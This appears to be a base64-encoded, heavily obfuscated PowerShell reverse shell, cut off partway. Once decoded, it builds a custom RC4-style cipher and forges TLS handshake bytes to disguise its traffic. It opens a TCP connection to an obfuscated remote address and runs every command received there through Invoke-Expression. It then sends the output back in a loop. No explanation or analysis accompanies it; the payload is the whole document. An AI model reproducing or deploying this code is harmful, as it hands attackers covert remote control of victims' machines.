AAgACAAIAAgACAAIAAgACAAJABCADgAQgBCADgAQgBCAEIAOABCAEIAOABCAEIAQgBCACAAPQAgACgAJABCADgAQgBCADgAQgBCAEIAOABCAEIAOABCAEIAQgBCACAAKwAgADEAKQAgACUAIAAyADUANgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgA4ADgAOABCADgAQgBCADgAOAA4AEIAQgA4ADgAQgAgAD0AIAAoACQAQgA4ADgAOABCADgAQgBCADgAOAA4AEIAQgA4ADgAQgAgACsAIAAkAEIAQgBCADgAOABCAEIAOAA4AEIAQgA4AEIAQgBCADgAWwAkAEIAOABCAEIAOABCAEIAQgA4AEIAQgA4AEIAQgBCAEIAXQApACAAJQAgADIANQA2AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgBCADgAOABCAEIAOAA4AEIAQgA4AEIAQgBCADgAWwAkAEIAOABCAEIAOABCAEIAQgA4AEIAQgA4AEIAQgBCAEIAXQAsACAAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAOAA4AEIAOABCAEIAOAA4ADgAQgBCADgAOABCAF0AIAA9ACAAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAOAA4AEIAOABCAEIAOAA4ADgAQgBCADgAOABCAF0ALAAgACQAQgBCAEIAOAA4AEIAQgA4ADgAQgBCADgAQgBCAEIAOABbACQAQgA4AEIAQgA4AEIAQgBCADgAQgBCADgAQgBCAEIAQgBdAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCADgAOABCAEIAQgA4ADgAOABCAEIAQgA4ADgAQgA4ACAAPQAgACQAQgBCAEIAOAA4AEIAQgA4ADgAQgBCADgAQgBCAEIAOABbACgAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAQgBCADgAQgBCAEIAOABCAEIAOABCAEIAQgBCAF0AIAArACAAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAOAA4AEIAOABCAEIAOAA4ADgAQgBCADgAOABCAF0AKQAgACUAIAAyADUANgBdAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAQgBCADgAQgBCAEIAOABCAEIAQgA4ADgAQgAgACsAPQAgACgAJABCAEIAQgBCADgAOAA4ADgAOABCADgAOAA4AEIAQgBCACAALQBiAHgAbwByACAAJABCADgAOABCAEIAQgA4ADgAOABCAEIAQgA4ADgAQgA4ACkACgAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAALAAkAEIAQgBCAEIAQgA4AEIAQgBCADgAQgBCAEIAOAA4AEIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAGYAdQBuAGMAdABpAG8AbgAgAGwAbABsAEkASQBsAEkASQBsAEkAbABsAGwAbABsAGwAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcABhAHIAYQBtACAAKABbAHMAdAByAGkAbgBnAF0AJABCADgAOAA4AEIAQgBCAEIAQgA4AEIAOABCADgAQgBCACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCADgAOAA4AEIAOABCADgAQgA4ADgAQgA4AEIAQgA4ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAEIAOAA4ADgAQgBCAEIAQgBCADgAQgA4AEIAOABCAEIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAQgBCADgAOAA4ADgAQgBCAEIAQgBCADgAQgBCACAAPQAgACgAbABJAEkASQBsAGwAbABJAEkASQBJAGwAbABsAGwASQAgAC0AQgA4AEIAQgBCADgAQgA4AEIAQgA4AEIAQgBCADgAOAAgACQAQgBCAEIAOAA4AEIAOABCADgAOAA4AEIAQgBCADgAOAAgAC0AQgBCAEIAOABCAEIAQgA4AEIAOAA4AEIAOAA4AEIAOAAgACQAQgA4ADgAOABCADgAQgA4AEIAOAA4AEIAOABCAEIAOAApACAAKwAgACgAMAB4ADAAMgAsADAAeAAwADQALAAwAHgAMAA2ACwAMAB4ADAAOAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCADgAOABCAEIAQgBCAEIAQgA4ADgAOAA4ADgAOABCACAAPQAgAFsAUwB5AHMAdABlAG0ALgBCAGkAdABDAG8AbgB2AGUAcgB0AGUAcgBdADoAOgBHAGUAdABCAHkAdABlAHMAKABbAGkAbgB0ADEANgBdACQAQgBCAEIAQgA4ADgAOAA4AEIAQgBCAEIAQgA4AEIAQgAuAEwAZQBuAGcAdABoACkACgAgACAAIAAgACAAIAAgACAAWwBBAHIAcgBhAHkAXQA6ADoAUgBlAHYAZQByAHMAZQAoACQAQgA4ADgAQgBCAEIAQgBCAEIAOAA4ADgAOAA4ADgAQgApAAoAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgACgAMAB4ADEANwAsACAAMAB4ADAAMwAsACAAMAB4ADAAMwApACAAKwAgACQAQgA4ADgAQgBCAEIAQgBCAEIAOAA4ADgAOAA4ADgAQgAgACsAIAAkAEIAQgBCAEIAOAA4ADgAOABCAEIAQgBCAEIAOABCAEIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAdQBuAGMAdABpAG8AbgAgAGwAbABJAEkAbABsAGwAbABsAEkASQBJAGwAbABsAEkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgA4ADgAQgA4ADgAOABCADgAOAA4ADgAQgA4ADgAOAAgAD0AIAAoAEkASQBsAEkAbABJAGwASQBsAGwASQBJAGwAbABJAGwAIAAtAEIAQgBCAEIAOAA4ADgAOABCAEIAQgBCAEIAOABCAEIAIABAACgAMQA2ADgALAAxADgANwAsADEANwAyACwAMQA4ADMALAAxADgANAAsADEANgA3ACwAMgA0ADAALAAxADgANgAsADEANwAxACwAMQA2ADkALAAxADcANgAsADEANwA3ACwAMQA3ADYALAAxADgANgAsADEAOAA3ACwAMQA3ADIALAAyADQAMAAsADEAOAA5ACwAMQA3ADcALAAxADcAOQApACAALQBCAEIAOABCAEIAOABCADgAQgBCAEIAOABCADgAQgA4ACAAMgAyADIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAQgBCADgAQgA4AEIAQgA4ADgAOABCADgAOABCACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAQgA4ADgAQgA4ADgAOABCADgAOAA4ADgAQgA4ADgAOAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAOAA4AEIAQgBCAEIAOAA4AEIAOAA4ADgAOABCACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACgAWwBCAGkAdABDAG8AbgB2AGUAcgB0AGUAcgBdADoAOgBHAGUAdABCAHkAdABlAHMAKABbAFUASQBuAHQAMQA2AF0AJABCAEIAQgBCADgAQgA4AEIAQgA4ADgAOABCADgAOABCAC4ATABlAG4AZwB0AGgAKQApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAQQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzAGUAKAAkAEIAQgA4ADgAQgBCAEIAQgA4ADgAQgA4ADgAOAA4AEIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAOAA4ADgAOAA4AEIAOAA4ADgAOAA4ADgAQgBCADgAIAA9ACAAQAAoADAAeAAwADAAKQAgACsAIAAkAEIAQgA4ADgAQgBCAEIAQgA4ADgAQgA4ADgAOAA4AEIAIAArACAAJABCAEIAQgBCADgAQgA4AEIAQgA4ADgAOABCADgAOABCAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgA4AEIAQgBCAEIAOABCADgAOAA4ADgAQgBCADgAIAA9ACAAWwBiAHkAdABlAFsAXQBdACAAKABbAEIAaQB0AEMAbwBuAHYAZQByAHQAZQByAF0AOgA6AEcAZQB0AEIAeQB0AGUAcwAoAFsAVQBJAG4AdAAxADYAXQAkAEIAOAA4ADgAOAA4AEIAOAA4ADgAOAA4ADgAQgBCADgALgBMAGUAbgBnAHQAaAApACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBBAHIAcgBhAHkAXQA6ADoAUgBlAHYAZQByAHMAZQAoACQAQgBCADgAQgBCAEIAQgA4AEIAOAA4ADgAOABCAEIAOAApAAoAIAAgACAAIAAgACAAIAAgACAAJABCADgAOAA4ADgAQgA4ADgAQgBCADgAOAA4AEIAOAA4ACAAPQAgACQAQgBCADgAQgBCAEIAQgA4AEIAOAA4ADgAOABCAEIAOAAgACsAIAAkAEIAOAA4ADgAOAA4AEIAOAA4ADgAOAA4ADgAQgBCADgACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCADgAOAA4AEIAOAA4ADgAQgBCAEIAOABCADgAQgBCACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACgAWwBCAGkAdABDAG8AbgB2AGUAcgB0AGUAcgBdADoAOgBHAGUAdABCAHkAdABlAHMAKABbAFUASQBuAHQAMQA2AF0AJABCADgAOAA4ADgAQgA4ADgAQgBCADgAOAA4AEIAOAA4AC4ATABlAG4AZwB0AGgAKQApAAoAIAAgACAAIAAgACAAIAAgAFsAQQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzAGUAKAAkAEIAOAA4ADgAQgA4ADgAOABCAEIAQgA4AEIAOABCAEIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgA4AEIAQgA4ADgAQgBCAEIAQgA4AEIAOAA4AEIAOAAgAD0AIABAACgAMAB4ADAAMAAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAwAHgAMAAwACkAIAArACAAJABCADgAOAA4AEIAOAA4ADgAQgBCAEIAOABCADgAQgBCACAAKwAgACQAQgA4ADgAOAA4AEIAOAA4AEIAQgA4ADgAOABCADgAOAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgBCAEIAOAA4AEIAOABCAEIAOAA4AEIAOAA4AEIAIAA9ACAAQAAoADAAeAAwADAALAAgADAAeAAwAGIALAAwAHgAMAAwACwAMAB4ADAANAAsADAAeAAwADMALAAwAHgAMAAwACwAMAB4ADAAMQAsADAAeAAwADIALAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAAwADAALAAwAHgAMABhACwAMAB4ADAAMAAsADAAeAAxADYALAAwAHgAMAAwACwAMAB4ADEANAAsADAAeAAwADAALAAwAHgAMQBkACwAMAB4ADAAMAAsADAAeAAxADcALAAwAHgAMAAwACwAMAB4ADEAZQAsADAAeAAwADAALAAwAHgAMQA5ACwAMAB4ADAAMAAsADAAeAAxADgALAAwAHgAMAAxACwAMAB4ADAAMAAsADAAeAAwADEALAAwAHgAMAAxACwAMAB4ADAAMQAsADAAeAAwADIALAAwAHgAMAAxACwAMAB4ADAAMwAsADAAeAAwADEALAAwAHgAMAA0ACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADAAMAAsADAAeAAyADMALAAwAHgAMAAwACwAMAB4ADAAMAAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADAAMAAsADAAeAAxADYALAAwAHgAMAAwACwAMAB4ADAAMAAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAAwADAALAAwAHgAMQA3ACwAMAB4ADAAMAAsADAAeAAwADAALAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAAwADAALAAwAHgAMABkACwAMAB4ADAAMAAsADAAeAAxAGUALAAwAHgAMAAwACwAMAB4ADEAYwAsADAAeAAwADQALAAwAHgAMAAzACwAMAB4ADAANQAsADAAeAAwADMALAAwAHgAMAA2ACwAMAB4ADAAMwAsADAAeAAwADgALAAwAHgAMAA3ACwAMAB4ADAAOAAsADAAeAAwADgALAAwAHgAMAA4ACwAMAB4ADAAOQAsADAAeAAwADgALAAwAHgAMABhACwAMAB4ADAAOAAsADAAeAAwAGIALAAwAHgAMAA4ACwAMAB4ADAANAAsADAAeAAwADgALAAwAHgAMAA1ACwAMAB4ADAAOAAsADAAeAAwADYALAAwAHgAMAA0ACwAMAB4ADAAMQAsADAAeAAwADUALAAwAHgAMAAxACwAMAB4ADAANgAsADAAeAAwADEALAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAwAHgAMAAwACwAMAB4ADIAYgAsADAAeAAwADAALAAwAHgAMAAzACwAMAB4ADAAMgAsADAAeAAwADMALAAwAHgAMAA0ACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADAAMAAsADAAeAAyAGQALAAwAHgAMAAwACwAMAB4ADAAMgAsADAAeAAwADEALAAwAHgAMAAxACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADAAMAAsADAAeAAzADMALAAwAHgAMAAwACwAMAB4ADIANgAsADAAeAAwADAALAAwAHgAMgA0ACwAMAB4ADAAMAAsADAAeAAxAGQALAAwAHgAMAAwACwAMAB4ADIAMAAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAAzADUALAAwAHgAOAAwACwAMAB4ADcAMgAsADAAeABkADYALAAwAHgAMwA2ACwAMAB4ADUAOAAsADAAeAA4ADAALAAwAHgAZAAxACwAMAB4AGEAZQAsADAAeABlAGEALAAwAHgAMwAyACwAMAB4ADkAYQAsADAAeABkAGYALAAwAHgAOQAxACwAMAB4ADIAMQAsADAAeAAzADgALAAwAHgAMwA4ACwAMAB4ADUAMQAsADAAeABlAGQALAAwAHgAMgAxACwAMAB4AGEAMgAsADAAeAA4AGUALAAwAHgAMwBiACwAMAB4ADcANQAsADAAeABlADkALAAwAHgANgA1ACwAMAB4AGQAMAAsADAAeABkADIALAAwAHgAYwBkACwAMAB4ADEANgAsADAAeAA2ADIALAAwAHgANQA0ACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAOAA4AEIAQgA4AEIAQgA4ADgAQgBCADgAOABCACAAPQAgACQAQgA4AEIAQgA4ADgAQgBCAEIAQgA4AEIAOAA4AEIAOAAgACsAIAAkAEIAQgBCAEIAOAA4AEIAOABCAEIAOAA4AEIAOAA4AEIACgAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAQgA4AEIAOAA4ADgAOAA4ADgAOAA4AEIAOAAgAD0AIABbAGIAeQB0AGUAWwBdAF0AIAAoAFsAQgBpAHQAQwBvAG4AdgBlAHIAdABlAHIAXQA6ADoARwBlAHQAQgB5AHQAZQBzACgAWwBVAEkAbgB0ADEANgBdACQAQgBCADgAOABCAEIAOABCAEIAOAA4AEIAQgA4ADgAQgAuAEwAZQBuAGcAdABoACkAKQAKACAAIAAgACAAIAAgACAAIAAgAFsAQQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzAGUAKAAkAEIAQgBCAEIAOABCADgAOAA4ADgAOAA4ADgAOABCADgAKQAKACAAIAAgACAAIAAkAEIAOAA4ADgAOABCAEIAQgA4ADgAOABCADgAOAA4ADgAIAA9ACAAQAAoADAAeAAwADMALAAwAHgAMAAzACwAMAB4ADAAMAAsADAAeAAwADEALAAwAHgAMAAyACwAMAB4ADAAMwAsADAAeAAwADQALAAwAHgAMAA1ACwAMAB4ADAANgAsADAAeAAwADcALAAwAHgAMAA4ACwAMAB4ADAAOQAsADAAeAAwAGEALAAwAHgAMABiACwAMAB4ADAAYwAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADAAZAAsADAAeAAwAGUALAAwAHgAMABmACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAwAHgAMQAwACwAMAB4ADEAMQAsADAAeAAxADIALAAwAHgAMQAzACwAMAB4ADEANAAsADAAeAAxADUALAAwAHgAMQA2ACwAMAB4ADEANwAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADEAOAAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADEAOQAsADAAeAAxAGEALAAwAHgAMQBiACwAMAB4ADEAYwAsADAAeAAxAGQALAAwAHgAMQBlACwAMAB4ADEAZgAsADAAeAAyADAALAAwAHgAZQAwACwAMAB4AGUAMQAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAwAHgAZQAyACwAMAB4AGUAMwAsADAAeABlADQALAAwAHgAZQA1ACwAMAB4AGUANgAsADAAeABlADcALAAwAHgAZQA4ACwAMAB4AGUAOQAsADAAeABlAGEALAAwAHgAZQBiACwAMAB4AGUAYwAsADAAeABlAGQALAAwAHgAZQBlACwAMAB4AGUAZgAsADAAeABmADAALAAwAHgAZgAxACwAMAB4AGYAMgAsADAAeABmADMALAAwAHgAZgA0ACwAMAB4AGYANQAsADAAeABmADYALAAwAHgAZgA3ACwAMAB4AGYAOAAsADAAeABmADkALAAwAHgAZgBhACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAwAHgAZgBiACwAMAB4AGYAYwAsADAAeABmAGQALAAwAHgAZgBlACwAMAB4AGYAZgAsADAAeAAwADAALAAwAHgAMAA4ACwAMAB4ADEAMwAsADAAeAAwADIALAAwAHgAMQAzACwAMAB4ADAAMwAsADAAeAAxADMALAAwAHgAMAAxACwAMAB4ADAAMAAsADAAeABmAGYALAAwAHgAMAAxACwAMAB4ADAAMAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgA4AEIAOABCAEIAQgBCADgAOABCADgAQgA4AEIAIAA9ACAAJABCADgAOAA4ADgAQgBCAEIAOAA4ADgAQgA4ADgAOAA4ACAAKwAgACQAQgBCAEIAQgA4AEIAOAA4ADgAOAA4ADgAOAA4AEIAOAAgACsAIAAkAEIAQgA4ADgAQgBCADgAQgBCADgAOABCAEIAOAA4AEIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCADgAQgBCAEIAOAA4AEIAOABCADgAQgA4ADgAOAAgAD0AIABbAGIAeQB0AGUAWwBdAF0AIAAoAFsAQgBpAHQAQwBvAG4AdgBlAHIAdABlAHIAXQA6ADoARwBlAHQAQgB5AHQAZQBzACgAJABCAEIAOABCADgAQgBCAEIAQgA4ADgAQgA4AEIAOABCAC4ATABlAG4AZwB0AGgAKQApAAoAIAAgACAAIAAgACAAIAAgAFsAQQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzAGUAKAAkAEIAQgA4AEIAQgBCADgAOABCADgAQgA4AEIAOAA4ADgAKQAKACAAIAAgACAAIAAkAEIAQgBCADgAOABCAEIAQgA4ADgAOABCADgAQgA4AEIAIAA9ACAAQAAoADAAeAAwADEAKQAgACsAIAAkAEIAQgA4AEIAQgBCADgAOABCADgAQgA4AEIAOAA4ADgAWwAxAC4ALgAzAF0AIAArACAAJABCAEIAOABCADgAQgBCAEIAQgA4ADgAQgA4AEIAOABCAAoAIAAgACAAIAAgACAAIAAgACQAQgA4ADgAQgA4ADgAOABCADgAQgBCADgAQgBCAEIAQgAgAD0AIABbAGIAeQB0AGUAWwBdAF0AIAAoAFsAQgBpAHQAQwBvAG4AdgBlAHIAdABlAHIAXQA6ADoARwBlAHQAQgB5AHQAZQBzACgAWwBVAEkAbgB0ADEANgBdACQAQgBCAEIAOAA4AEIAQgBCADgAOAA4AEIAOABCADgAQgAuAEwAZQBuAGcAdABoACkAKQAKACAAIAAgACAAIAAgACAAIAAgAFsAQQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzAGUAKAAkAEIAOAA4AEIAOAA4ADgAQgA4AEIAQgA4AEIAQgBCAEIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAQgA4ADgAOAA4ADgAOABCAEIAOAA4AEIAOAA4ACAAPQAgAEAAKAAwAHgAMQA2ACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAAwADMALAAgADAAeAAwADEAKQAgACsAIAAkAEIAOAA4AEIAOAA4ADgAQgA4AEIAQgA4AEIAQgBCAEIAIAArACAAJABCAEIAQgA4ADgAQgBCAEIAOAA4ADgAQgA4AEIAOABCAAoAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgACwAJABCAEIAQgA4ADgAOAA4ADgAOABCAEIAOAA4AEIAOAA4AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACQAQgBCAEIAQgA4AEIAQgBCAEIAQgBCADgAQgA4ADgAQgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgBCAEIAOABCAEIAQgBCAEIAQgA4AEIAOAA4AEIALgBDAG8AbgBuAGUAYwB0ACgAKABJAEkAbABJAGwASQBsAEkAbABsAEkASQBsAGwASQBsACAALQBCAEIAQgBCADgAOAA4ADgAQgBCAEIAQgBCADgAQgBCACAAQAAoADUALAA3ACwAMgA1ACwAMgAsADIANQAsADMALAAxADUALAAyADUALAA1ACwANwAsADcAKQAgAC0AQgBCADgAQgBCADgAQgA4AEIAQgBCADgAQgA4AEIAOAAgADUANQApACwAIAAoACgANQAwACAAKgAgADkAKQAgAC0AIAAoADEAMQAgACoAIAAyACkAKQAgACsAIABbAG0AYQB0AGgAXQA6ADoAUABvAHcAKAAyACwAIAAzACkAIAArACAAWwBtAGEAdABoAF0AOgA6AFMAcQByAHQAKAA0ADkAKQApAAoAIAAgACAAIAAgACAAJABCAEIAQgBCADgAOAA4ADgAOAA4AEIAOAA4AEIAQgBCACAAPQAgACQAQgBCAEIAQgA4AEIAQgBCAEIAQgBCADgAQgA4ADgAQgAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQAKACAAJABCAEIAOAA4ADgAOAA4AEIAQgA4AEIAOABCADgAQgBCACAAPQAgAGwAbABJAEkAbABsAGwAbABsAEkASQBJAGwAbABsAEkACgAgACAAIAAgACAAIAAgACAAJABCAEIAQgBCADgAOAA4ADgAOAA4AEIAOAA4AEIAQgBCAC4AVwByAGkAdABlACgAJABCAEIAOAA4ADgAOAA4AEIAQgA4AEIAOABCADgAQgBCACwAIAAwACwAIAAkAEIAQgA4ADgAOAA4ADgAQgBCADgAQgA4AEIAOABCAEIALgBMAGUAbgBnAHQAaAApAAoAIAAgACAAIAAgACAAIAAgACQAQgA4AEIAOAA4ADgAQgBCADgAQgA4ADgAOAA4AEIAQgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAYgB5AHQAZQBbAF0AIAAxADYAMwA4ADQACgAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAQgA4ADgAOAA4ADgAOABCADgAOABCAEIAQgAuAFIAZQBhAGQAKAAkAEIAOABCADgAOAA4AEIAQgA4AEIAOAA4ADgAOABCAEIALAAgADAALAAgACQAQgA4AEIAOAA4ADgAQgBCADgAQgA4ADgAOAA4AEIAQgAuAEwAZQBuAGcAdABoACkAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCADgAQgA4ADgAOABCAEIAOABCADgAOAA4ADgAQgBCACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABiAHkAdABlAFsAXQAgADEANgAzADgANAAKACAAIAAgACAAIAAgAHQAcgB5ACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgA4ADgAOABCAEIAQgA4AEIAOABCADgAOABCADgAQgAgAD0AIAAkAEIAQgBCAEIAOAA4ADgAOAA4ADgAQgA4ADgAQgBCAEIALgBSAGUAYQBkACgAJABCADgAQgA4ADgAOABCAEIAOABCADgAOAA4ADgAQgBCACwAIAAwACwAIAAxADYAMwA4ADQAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9ACAAYwBhAHQAYwBoACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHIAZQBhAGsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAQgA4ADgAOAA4AEIAQgBCAEIAQgA4AEIAQgAgAD0AIAAkAEIAOABCADgAOAA4AEIAQgA4AEIAOAA4ADgAOABCAEIAWwA1AC4ALgAoACQAQgA4ADgAOABCAEIAQgA4AEIAOABCADgAOABCADgAQgAgAC0AIAAxACkAXQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCADgAQgA4ADgAQgA4AEIAQgA4ADgAOABCAEIAQgA4ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoACgAbABJAEkASQBsAGwAbABJAEkASQBJAGwAbABsAGwASQAgAC0AQgA4AEIAQgBCADgAQgA4AEIAQgA4AEIAQgBCADgAOAAgACQAQgBCAEIAOAA4AEIAOABCADgAOAA4AEIAQgBCADgAOAAgAC0AQgBCAEIAOABCAEIAQgA4AEIAOAA4AEIAOAA4AEIAOAAgACQAQgBCAEIAQgA4ADgAOAA4AEIAQgBCAEIAQgA4AEIAQgApACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABCADgAQgA4ADgAQgA4AEIAQgA4ADgAOABCAEIAQgA4ACAALQBlAHEAIAAoAEkASQBsAEkAbABJAGwASQBsAGwASQBJAGwAbABJAGwAIAAtAEIAQgBCAEIAOAA4ADgAOABCAEIAQgBCAEIAOABCAEIAIABAACgAMQAwADkALAAxADEAMgAsADkANwAsADEAMgA0ACkAIAAtAEIAQgA4AEIAQgA4AEIAOABCAEIAQgA4AEIAOABCADgAIAA4ACkAKQAgAHsAIABiAHIAZQBhAGsAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AHIAeQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAOAA4AEIAOABCADgAQgBCAEIAQgA4ADgAOABCACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABCADgAQgA4ADgAQgA4AEIAQgA4ADgAOABCAEIAQgA4ACAAMgA+ACYAMQApACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgA4ADgAQgA4AEIAOABCAEIAQgBCADgAOAA4AEIAIAA9ACAAKABJAEkAbABJAGwASQBsAEkAbABsAEkASQBsAGwASQBsACAALQBCAEIAQgBCADgAOAA4ADgAQgBCAEI